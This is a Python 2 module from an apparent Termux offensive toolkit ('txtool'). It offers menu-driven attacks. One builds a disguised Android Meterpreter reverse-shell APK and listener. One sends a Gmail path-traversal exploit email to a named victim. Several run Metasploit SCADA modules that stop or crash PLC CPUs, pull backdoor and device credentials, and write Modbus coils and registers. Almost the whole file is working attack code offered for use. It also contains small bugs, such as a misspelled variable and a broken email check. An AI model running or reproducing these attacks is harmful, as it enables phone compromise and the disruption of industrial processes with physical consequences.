#!/data/data/com.termux/files/usr/bin/python2
# -*- coding: utf-8 -*-

import subprocess, sys, getpass, os, socket, smtplib, mimetypes, random
from email import encoders
from email.message import Message
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

sys.path.append("/data/data/com.termux/files/usr/share/txtool/core")
from fungsi import warna, IP2, txtool_dir, finish_exploit, IP, ipv4
from sub_menu import kembali
import sub_menu3 as back

path = "/data/data/com.termux/files/usr/share/txtool/core"

if os.path.isfile("/data/data/com.termux/files/usr/bin/msfvenom") and os.path.isfile("/data/data/com.termux/files/usr/bin/msfconsole"):
    metasploit_path = "/data/data/com.termux/files/usr/bin"

elif os.path.isdir("/data/data/com.termux/files/home/metasploit-framework"):
    metasploit_path = "/data/data/com.termux/files/home/metasploit-framework"

def start():
    print(warna.hijau + "\n[*] " + warna.tutup + "fire up metasploit, please wait a moment...")
    subprocess.Popen("%s/msfconsole -q -r %s/payload.rc" %
                      (metasploit_path, txtool_dir), shell=True).wait()

def canceled():
    print(warna.merah + "\n[x] " + warna.tutup + " Wrong command. txtool will be assume exploitation has been canceled.")
    raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")


def empty():
    try:
        print(warna.kuning + "\n[!] " + warna.tutup + "Warning. your input is empty, txtool will be assume exploitation is canceled")
        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")

    except KeyError:
        pass


def menu1():
    alamat_ip = IP2()
    lhost = alamat_ip
    port = raw_input(warna.biru + "\n[+]" + warna.tutup + " Enter Port for reverse listener [1492]" + warna.kuning + "  >> " + warna.tutup)
    if port == "": port = "1492"
    payload = 'android/meterpreter/reverse_tcp'
    print(warna.hijau + "\n[*]" + warna.tutup + " creating mallicious app, please wait a moment...")
    subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s R> %s/system_upgrade.apk" %
        (metasploit_path, payload, lhost, port, txtool_dir),stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
    print(warna.hijau + "\n[*]" + warna.tutup + " successfully creating mallicious app, apk file has been saved to %s/system_upgrade.apk\n" %
        (txtool_dir))
    filewrite = open(txtool_dir + "/payload.rc", "w")
    filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" %
        (payload, lhost, port))
    filewrite.close()
    payload_query = raw_input((warna.biru + "[+]" + warna.tutup + " Do you want to start listener right now ? {0}(yes/no){1}" + warna.kuning + "  >> " + warna.tutup).format(warna.hijau, warna.tutup))
    if payload_query == '' or payload_query.lower() == "y" or payload_query.lower() == "yes":
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        kembali()

    elif payload_query.lower() == "n" or payload_query.lower() == "no":
        print("\n{0}Canceled{1}".format(warna.merah, warna.tutup))
        kembali()

    else:
        try:
            return kembali()

        except KeyError:
            kembali()

def menu2():
    '''
Author : Google Security Research
Source : https://www.exploit-db.com/exploits/43189/
Source : https://bugs.chromium.org/p/project-zero/issues/detail?id=1342

'''
    IP()
    print(warna.kuning + "\n[!] " + warna.tutup + "There is a directory traversal issue in attachment downloads in Gmail. For non-gmail accounts, there is no path sanitization on the attachment filename in the email, so when attachments are downloaded, a file with any name and any contents can be written to anywhere on the filesystem that the Gmail app can access.")
    print(warna.kuning + "\n[!] " + warna.tutup + "This should be your email address")
    FROM_ADDRESS = raw_input(warna.biru + "[+] " + warna.tutup + "email adress" + warna.kuning + "  >>  " + warna.tutup)
    if FROM_ADDRESS == "":
        empty()
        kembali()

    if "@" and "." not in FROM_ADDRESS:
        print(warna.merah + "\n[x] " + warna.tutup + "email address not valid, double check your input before hit Enter button")
        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
        kembali()

    print(warna.kuning + "\n[!] " + warna.tutup + "enable POP/IMAP forwarding in your account and to avoid google blocking messages you can use App Passwords (16 digit passcode), or allowing less secure apps in your account.")
    print(warna.kuning + "[!] " + warna.tutup + "learn more : https://support.google.com/mail/answer/7126229#cantsignin")
#    print(warna.kuning + "\n[!] " + warna.tutup + "be carefull, watch your keyboard. password is invisible.")
#    YOUR_CREDENTIAL = getpass.getpass(warna.biru + "[+] " + warna.tutup + "Password" +warna.kuning + "  >>  " + warna.tutup)
    YOUR_CREDENTIAL = raw_input(warna.biru + "[+] " + warna.tutup + "Password" + warna.kuning + "  >>  " + warna.tutup)
    if YOUR_CREDENTIAL == "":
        empty()
        kembali()

    print(warna.kuning + "\n[!] " + warna.tutup + "Messages subject")
    SUBJECT = raw_input(warna.biru + "[+] " + warna.tutup + "subject" + warna.kuning + "  >>  " + warna.tutup)
    if SUBJECT == "":
        empty()
        kembali()

    print(warna.kuning + "\n[!] " + warna.tutup + "Write your messages")
    MESSAGE = raw_input(warna.biru + "[+] " + warna.tutup + "Messages" + warna.kuning + "  >>  " + warna.tutup)
    if MESSAGE == "":
        empty()
        kembali()

    print(warna.kuning + "\n[!] " + warna.tutup + "this should be the victim email address")
    TO_ADDRESS = raw_input(warna.biru + "[+] " + warna.tutup + "to address" + warna.kuning + "  >>  " + warna.tutup)
    if TO_ADDRESS == "":
        empty()
        kembali()

    if "@" and "." not in TO_ADDRESS:
        print(warna.merah + "\n[x] " + warna.tutup + "email address not valid, double check your input before hit Enter button")
        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
        kembali()

    composed = """Content-Type: multipart/signed; protocol="application/x-pkcs7-signature"; micalg=sha1; boundary="----714A286D976BF3E58D9D671E37CBCF7C"
MIME-Version: 1.0
Subject: """+ SUBJECT +"""
To: """+ TO_ADDRESS +"""
From: """ + FROM_ADDRESS + """

You will not see this in a MIME-aware mail reader.

------714A286D976BF3E58D9D671E37CBCF7C
Content-Type: text/html

<html><body><b>"""+ MESSAGE +"""</b></body></html>

------714A286D976BF3E58D9D671E37CBCF7C
Content-Type: audio/wav; name="../../../../data/data/com.google.android.gm/databases/EmailProviderBody.db-journal"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="%2e%2e%2fqpng"

2dUF+SChY9f/////AAAAABAAAAAAAQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGRyb2lkX21l
dGFkYXRhYW5kcm9pZF9tZXRhZGF0YQNDUkVBVEUgVEFCTEUgAAAARlkAAABFSgAAAEs7AAAASSw=

------714A286D976BF3E58D9D671E37CBCF7C"""

    print(warna.hijau + "\n[*] " + warna.tutup + "Sending email, please wait a moment...")
    try:
        target = TO_ADDRESS
        send = smtplib.SMTP_SSL("smtp.gmail.com")

    except smtplib.socket.gaierror as a:
        print warna.merah + "\n[x] " + warna.tutup + "An error occured :" ,a
        print warna.merah + "\n[x] " + warna.tutup + "Sending email failed"
        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
        kembali()

    try:
        send.login(FROM_ADDRESS, YOUR_CREDENTIAL)

    except smtplib.SMTPAuthenticationError as b:
        print warna.merah + "\n[x] " + warna.tutup + "An error occured :" ,b
        send.quit()
        print warna.merah + "\n[x] " + warna.tutup + "Sending email failed"
        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
        kembali()

    try:
        send.sendmail(FROM_ADDRESS, target, composed)
        return True

    except Exception:
        print warna.merah + "\n[x] " + warna.tutup + "An error occured :"
        print warna.merah + "\n[x] " + warna.tutup + "Sending email failed"
        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
        kembali()

    except KeyError:
        kembali()

    finally:
        send.quit()
        print(warna.hijau + "\n[*] " + warna.tutup + "email has been successfully sent to %s" % (TO_ADDRESS))
        finish_exploit()
        kembali()

def menu5():
    IP()
    print(warna.kuning + "\n[!] " + warna.tutup + " The EtherNet/IP CIP protocol allows a number of unauthenticated commands to a PLC which implements the protocol.  This module implements the CPU STOP command, as well as the ability to crash the Ethernet card in an affected device.")
    ip = raw_input(warna.biru + "\n[+] " + warna.tutup + " Enter IP address of the PLC (RHOST) " + warna.kuning + " >> " + warna.tutup)
    if ip == '':
        empty()
        back.menu['menu_utama']()

    print(warna.kuning + "\n[!] " + warna.tutup + " default port is 44818")
    port = raw_input(warna.biru + "\n[+] " + warna.tutup + " set Port number" + warna.kuning + " >> " + warna.tutup)
    if port == '':
        port = '44818'

    print(warna.kuning + "\n[!] " + warna.tutup + " only 4 attacks that will be accepted. (STOPCPU, CRASHCPU, CRASHETHER, RESETETHER)")
    print(warna.hijau + "\n[*] " + warna.tutup + " Attacks : \n\t1 = STOPCPU\n\t2 = CRASHCPU\n\t3 = CRASHETHER\n\t4 = RESETETHER\n")
    attack = raw_input(warna.biru + "[+] " + warna.tutup + " The attack to use" + warna.kuning + "  >>  " + warna.tutup)
    if attack == '':
        empty()
        back.menu['menu_utama']()

    if attack == '1':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset RPORT %s\nset ATTACK STOPCPU\nexploit\r\n\r\n" %
                        (ip, port))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if attack == '2':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset RPORT %s\nset ATTACK CRASHCPU\nexploit\r\n\r\n" %
                        (ip, port))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if attack == '3':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset RPORT %s\nset ATTACK CRASHETHER\nexploit\r\n\r\n" %
                        (ip, port))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if attack == '4':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset RPORT %s\nset ATTACK RESETETHER\nexploit\r\n\r\n" %
                        (ip, port))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    else:
        canceled()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()


def menu6():
    IP()
    print(warna.kuning + "\n[!] " + warna.tutup + " The Moxa protocol listens on 4800/UDP and will respond to broadcast or direct traffic.  The service is known to be used on Moxa devices in the NPort, OnCell, and MGate product lines.  Many devices with firmware versions older than 2017 or late 2016 allow admin credentials and SNMP read and read/write community strings to be retrieved without authentication.")
    ip = raw_input(warna.biru + "\n[+] " + warna.tutup + " Enter IP address of the PLC (RHOST) " + warna.kuning + " >> " + warna.tutup)
    if ip == '':
        empty()
        back.menu['menu_utama']()

    print(warna.kuning + "\n[!] " + warna.tutup + " only 2 function that will be accepted. (CREDS or ENUM)")
    print(warna.hijau + "[*] " + warna.tutup + " Functions : \n\t1 = CREDS\n\t2 = ENUM\n")
    print(warna.kuning + "[!] " + warna.tutup + " Pull credentials or enumerate all function codes")
    function = raw_input(warna.biru + "[+] " + warna.tutup + " Set function" + warna.kuning + " >>  " + warna.tutup)
    if function == '':
        empty()
        back.menu['menu_utama']()

    if function == '1':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/moxa_credentials_recovery\nset RHOST %s\nset FUNCTION CREDS\nexploit\r\n\r\n" % (ip))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if function == '2':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/moxa_credentials_recovery\nset RHOST %s\nset FUNCTION ENUM\nexploit\r\n\r\n" % (ip))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    else:
        canceled()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()


def menu7():
    IP()
    print(warna.kuning + "\n[!] " + warna.tutup + " The Schneider Modicon Quantum series of Ethernet cards store usernames and passwords for the system in files that may be retrieved via backdoor access.")
    ip = raw_input(warna.biru + "\n[+] " + warna.tutup + " Enter IP address of the PLC (RHOST) " + warna.kuning + " >> " + warna.tutup)
    if ip == '':
        empty()
        back.menu['menu_utama']()

    print(warna.kuning + "\n[!] " + warna.tutup + " The backdoor account to use for login")
    username = raw_input(warna.biru + "[+] " + warna.tutup + " Enter the username" + warna.kuning + " >> " + warna.tutup)
    if username == '':
        empty()
        back.menu['menu_utama']()

    print(warna.kuning + "\n[!] " + warna.tutup + " The backdoor password to use for login")
    password = raw_input(warna.biru + "[+] " + warna.tutup + " Enter password" + warna.kuning + " >> " + warna.tutup)
    if password == '':
        empty()
        back.menu['menu_utama']()

    else:
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/modicon_password_recovery\nset RHOST %s\nset FTPUSER %s\nset FTPPASS %s\nexploit\r\n\r\n" %
                        (ip, username, password))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()


def menu8():
    IP()
    print(warna.kuning + "\n[!] " + warna.tutup + " allows a remote user to change the state of the PLC between STOP and RUN, allowing an attacker to end process control by the PLC.")
    ip = raw_input(warna.biru + "\n[+] " + warna.tutup + " Enter IP address of the PLC (RHOST) " + warna.kuning + " >> " + warna.tutup)
    if ip == '':
        empty()
        back.menu['menu_utama']()

    print(warna.kuning + "\n[!] " + warna.tutup + " only 2 commands that will be accepted. (STOP or RUN)")
    print(warna.hijau + "\n[*] " + warna.tutup + " Command : \n\t1 = STOP\n\t2 = RUN\n")
    command = raw_input(warna.biru + "[+] " + warna.tutup + " Set the command" + warna.kuning + "  >>  " + warna.tutup)
    if command == '':
        empty()
        back.menu['menu_utama']()

    if command == '1' or command == 'STOP' or command == 'stop':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/modicon_command\nset RHOST %s\nset MODE STOP\nexploit\r\n\r\n" % (ip))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if command == '2' or command == 'RUN' or command == 'run':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/modicon_command\nset RHOST %s\nset MODE RUN\nexploit\r\n\r\n" % (ip))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    else:
        canceled()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

def menu9():
    IP()
    print(warna.kuning + "\n[!]" + warna.tutup + " Print out CPU status and reverts it, tested and working on ILC150 (at least partially working on others")
    ip = raw_input(warna.biru + "\n[+]" + warna.tutup + " ip address" + warna.kuning + "  >>  " + warna.tutup)
    true_ip = ipv4(ip)
    if ip == '':
        empty()
        back.menu['menu_utama']()

    elif not true_ip:
        print(warna.merah + "\n[x] " + warna.tutup + "Incorrect ip address, txtool will be assume exploitation is canceled")
        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
        back.menu['menu_utama']()

    else:
        subprocess.Popen("%s/PhoenixControlPLC-ILC150.py %s " %
                         (path, ip), shell=True).wait()
        sys.exit()

def menu10():
    IP()
    print(warna.kuning + "\n[!]" + warna.tutup + " reading inputs, setting outputs, and merkers of for Siemens S7-1200 (firmware <= v3)")
    ip = raw_input(warna.biru + "\n[+]" + warna.tutup + " ip address" + warna.kuning + "  >>  " + warna.tutup)
    true_ip = ipv4(ip)
    if ip == '':
        empty()
        back.menu['menu_utama']()

    elif not true_ip:
        print(warna.merah + "\n[x] " + warna.tutup + "Incorrect ip address, txtool will be assume exploitation is canceled")
        raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
        back.menu['menu_utama']()

    print(warna.kuning + "\n[!]" + warna.tutup + " The default port is 102")
    port = raw_input(warna.biru + "[+]" + warna.tutup + " port number" + warna.kuning + "  >>  " + warna.tutup)
    if port == "":
        port = "102"

    print(warna.kuning + '\n[!]' + warna.tutup + ' Example : "10101010,3" to set merkers 3.0 through 3.7')
    merker = raw_input(warna.biru + "[+]" + warna.tutup + " Set the merkers" + warna.kuning + "  >>  " + warna.tutup)
    print(warna.kuning + '\n[!] ' + warna.tutup + 'Example set output : "00000000"')
    output = raw_input(warna.biru + "[+] " + warna.tutup + "Set outputs" + warna.kuning + "  >>  " + warna.tutup)
    if output == '' and merker =='' and port =='':
        subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p 102 -r " %
                         (path, ip), shell=True).wait()
        finish_exploit()
        back.menu['menu_utama']()
        sys.exit()

    if port == '' and merker =='':
        subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p 102 -o %s " %
                         (path, ip, output), shell=True).wait()
        finish_exploit()
        back.menu['menu_utama']()
        sys.exit()

    if port == '' and output == '':
        subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p 102 -m %s " %
                         (path, ip, merker), shell=True).wait()
        finish_exploit()
        back.menu['menu_utama']()
        sys.exit()

    elif merker =='' and output == '':
        subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p %s -r " %
                         (path, ip, port), shell=True).wait()
        finish_exploit()
        back.menu['menu_utama']()
        sys.exit()

    elif merker =='':
        subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p %s -o %s " %
                         (path, ip, port, output), shell=True).wait()
        finish_exploit()
        back.menu['menu_utama']()
        sys.exit()

    elif output == '':
        subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p %s -m %s " %
                         (path, ip, port, marker), shell=True).wait()
        finish_exploit()
        back.menu['menu_utama']()
        sys.exit()

    else:
        subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p %s -o %s -m %s " %
                         (path, ip, port, output, merker), shell=True).wait()
        finish_exploit()
        back.menu['menu_utama']()
        sys.exit()

def menu11():
    IP()
    print(warna.kuning + "\n[!] " + warna.tutup + " reading and writing data to a PLC using the Modbus protocol.")
    ip = raw_input(warna.biru + "\n[+] " + warna.tutup + " Enter IP address of the PLC (RHOST) " + warna.kuning + "  >>  " + warna.tutup)
    if ip == '':
        empty()
        back.menu['menu_utama']()

    print(warna.kuning + "\n[!] " + warna.tutup + " default port number is 502")
    port = raw_input(warna.biru + "[+] " + warna.tutup + " set PORT" + warna.kuning + "  >>  " + warna.tutup)
    if port == '':
        port = '502'

    print(warna.kuning + "\n[!] " + warna.tutup + " default modbus Unit ID is 1")
    uid = raw_input(warna.biru + "[+] " + warna.tutup + " set UNIT_NUMBER" + warna.kuning + "  >>  " + warna.tutup)
    if uid == '':
        uid = '1'

    print(warna.kuning + "\n[!] " + warna.tutup + " Modbus data address (must be numerical)")
    data_address = raw_input(warna.biru + "[+] " + warna.tutup + " set DATA_ADDRESS" + warna.kuning + "  >>  " + warna.tutup)
    if data_address == '':
        empty()
        back.menu['menu_utama']()

    print(warna.hijau + "\n[*] " + warna.tutup + " ACTION : \n\t1 = READ_REGISTERS (Read words from several registers)\n\t2 = READ_COILS (Read bits from several coils)\n\t3 = WRITE_REGISTER (Write one word to a register)\n\t4 = WRITE_COIL (Write one bit to a coil)\n\t5 = WRITE_REGISTERS (Write words to several registers)\n\t6 = WRITE_COILS (Write bits to several coils)")
    action = raw_input(warna.biru + "[+] " + warna.tutup + " Choose an action" + warna.kuning + "  >>  " + warna.tutup)
    if action == '':
        empty()
        back.menu['menu_utama']()

    if action == '1':
        print(warna.kuning + "\n[!] " + warna.tutup + " Number of registers to read, default is 1")
        number = raw_input(warna.biru + "[+] " + warna.tutup + " set NUMBER" + warna.kuning + "  >>  " + warna.tutup)
        if number == '':
            number = '1'
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset RPORT %s\nset UNIT_NUMBER %s\nset DATA_ADDRESS %s\nset NUMBER %s\nset ACTION READ_REGISTERS\nexploit\r\n\r\n" %
                        (ip, port, uid, data_address, number))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if action == '2':
        print(warna.kuning + "\n[!] " + warna.tutup + " Number of coils to read, default is 1")
        number2 = raw_input(warna.biru + "[+] " + warna.tutup + " set NUMBER" + warna.kuning + "  >>  " + warna.tutup)
        if number2 == '':
            number2 = '1'
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset RPORT %s\nset UNIT_NUMBER %s\nset DATA_ADDRESS %s\nset NUMBER %s\nset ACTION READ_COILS\nexploit\r\n\r\n" %
                        (ip, port, uid, data_address, number2))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if action == '3':
        print(warna.kuning + '\n[!] ' + warna.tutup + ' Data to write (must be numerical)')
        data = raw_input(warna.biru + "[+] " + warna.tutup + "set DATA" + warna.kuning + "  >>  " + warna.tutup)
        if data == '':
            empty()
            back.menu['menu_utama']()

        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset RPORT %s\nset UNIT_NUMBER %s\nset DATA_ADDRESS %s\nset DATA %s\nset ACTION WRITE_REGISTER\nexploit\r\n\r\n" %
                        (ip, port, uid, data_address, data))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if action == '4':
        print(warna.kuning + '\n[!] ' + warna.tutup + ' Data to write (must be numerical)')
        data2 = raw_input(warna.biru + "[+] " + warna.tutup + " set DATA" + warna.kuning + "  >>  " + warna.tutup)
        if data2 == '':
            empty()
            back.menu['menu_utama']()

        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset RPORT %s\nset UNIT_NUMBER %s\nset DATA_ADDRESS %s\nset DATA %s\nset ACTION WRITE_COIL\nexploit\r\n\r\n" %
                        (ip, port, uid, data_address, data2))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if action == '5':
        print(warna.kuning + '\n[!] ' + warna.tutup + ' Words to write to each register separated with a comma')
        print(warna.kuning + '[!] ' + warna.tutup + ' Example : 1,2,3,4')
        data_reg = raw_input(warna.biru + "[+] " + warna.tutup + " set DATA_REGISTERS" + warna.kuning + "  >>  " + warna.tutup)
        if data_reg == '':
            empty()
            back.menu['menu_utama']()

        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset RPORT %s\nset UNIT_NUMBER %s\nset DATA_ADDRESS %s\nset DATA_REGISTERS %s\nset ACTION WRITE_REGISTERS\nexploit\r\n\r\n" %
                        (ip, port, uid, data_address, data_reg))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if action == '6':
        print(warna.kuning + '\n[!] ' + warna.tutup + ' Data in binary to write')
        print(warna.kuning + '[!] ' + warna.tutup + ' Example : 0110')
        data_coil = raw_input(warna.biru + "[+] " + warna.tutup + " set DATA_COILS" + warna.kuning + "  >>  " + warna.tutup)
        if data_coil == '':
            empty()
            back.menu['menu_utama']()

        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset RPORT %s\nset UNIT_NUMBER %s\nset DATA_ADDRESS %s\nset DATA_COILS %s\nset ACTION WRITE_COILS\nexploit\r\n\r\n" %
                        (ip, port, uid, data_address, data_coil))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    else:
        canceled()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()
